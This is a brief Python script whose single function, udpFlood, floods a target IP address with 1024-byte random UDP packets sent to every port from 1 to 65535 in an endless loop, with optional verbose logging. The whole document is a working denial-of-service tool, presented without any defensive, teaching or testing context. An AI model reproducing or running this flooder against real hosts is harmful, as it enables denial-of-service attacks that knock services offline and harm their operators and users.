#!/usr/bin/python
import socket
import random


#Gets ip and Verbouse flag
#Sends random udp packets to every port in target
def udpFlood(ip, Verbouse):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytas = random._urandom(1024) #creates packet
    sent = 0
    print "Started Udp Flood on ", ip
    try:
        while 1:
            for i in range(1, 65536):
                sock.sendto(bytas, (ip, i))
                if Verbouse:
                    print("Sent %s amount of packets to %s at port %s"%(sent, ip, i))
                sent +=1
    except KeyboardInterrupt:
        print "Interrupted by your order!"


